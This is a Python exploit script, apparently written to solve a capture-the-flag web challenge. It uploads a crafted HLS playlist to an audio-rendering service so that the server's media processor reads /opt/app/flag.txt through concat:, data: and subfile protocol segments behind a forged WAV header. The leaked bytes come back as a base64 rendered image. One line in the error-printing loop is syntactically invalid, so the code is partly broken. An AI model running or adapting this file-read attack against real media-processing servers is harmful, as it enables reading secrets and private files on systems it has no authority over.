#!/usr/bin/env python3
import io, json, base64, struct, urllib.request, urllib.error, http.cookiejar, math

BASE="https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
def sess():
    cj=http.cookiejar.CookieJar()
    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)); o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
def do(o,path,data=None,headers=None,method=None):
    r=urllib.request.Request(BASE+path,data=data,method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    try:
        resp=o.open(r,timeout=120); return resp.status,dict(resp.getheaders()),resp.read()
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read()
    except Exception as e: return -1,{},str(e).encode()
def upload(o,content,fn="clip.wav",ct="audio/wav"):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: {ct}\r\n\r\n").encode())
    body.write(content); body.write(f"\r\n--{bd}--\r\n".encode())
    return do(o,"/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")
def render(o,**kw):
    st,h,b=do(o,"/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return json.loads(b)
    except: return b.decode('utf-8','replace')
def realwav():
    n=8000; fr=b"".join(struct.pack("<h",int(4000*math.sin(2*math.pi*300*i/8000))) for i in range(n))
    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,8000,16000,2,16)+b"data"+struct.pack("<I",len(fr))+fr

# WAV header (u8 mono 8000Hz) with huge data size so following bytes are read as PCM
def wavhdr():
    h=b"RIFF"+struct.pack("<I",0xFFFFFF00)+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,8000,8000,1,8)+b"data"+struct.pack("<I",0xFFFFFF00)
    return h
HDR64=base64.b64encode(wavhdr()).decode()

def m3u8(segment):
    return ("#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:2\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:2.0,\n"+segment+"\n#EXT-X-ENDLIST\n").encode()

o=sess(); do(o,"/studio")
upload(o, realwav())
j=render(o,slug="probe",theme="midnight")
ws=j["outputs"][0]["url"].split("/")[2]
print("WS=",ws)
SELF=f"/opt/app/media/{ws}/source.wav"

def trial(name, segment, show_png=False):
    upload(o, m3u8(segment))   # overwrite source.wav with the m3u8 (still ws=ws)
    j=render(o,slug="p",theme="midnight")
    ok=j.get("ok") if isinstance(j,dict) else None
    err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
    print(f"\n######## {name} ok={ok}\nSEGMENT={segment[:160]}")
    if err:
        # show stream/duration + key hls/protocol messages
        for key in ["Duration","Stream #0:0","allowed","not in","Protocol","protocol","Invalid","Too few","Error","No such","Unsafe","Skip","open"]:
            for line in err.splitlines():
                if key in line: print("  |",line.strip())
                break if False else None
    if ok and show_png:
        st,h,png=do(o,j["outputs"][0]["url"])
        print(f"B64_{name}_START"); print(base64.b64encode(png).decode()); print(f"B64_{name}_END")

# D1: concat data-header + self trailer (plumbing)
trial("D1_concat_data_self", f"concat:data:audio/wav;base64,{HDR64}|{SELF}")
# D2: concat data-header + file(flag) + self trailer  (ends .wav)
trial("D2_concat_flag", f"concat:data:audio/wav;base64,{HDR64}|/opt/app/flag.txt|{SELF}", show_png=True)
# D3: subfile read of flag
trial("D3_subfile_flag", f"concat:data:audio/wav;base64,{HDR64}|subfile,,start,0,end,4096,,:/opt/app/flag.txt|{SELF}", show_png=True)
# D4: plain file flag as sole segment (baseline ext check)
trial("D4_plain_flag", "/opt/app/flag.txt")
print("\nDONE")
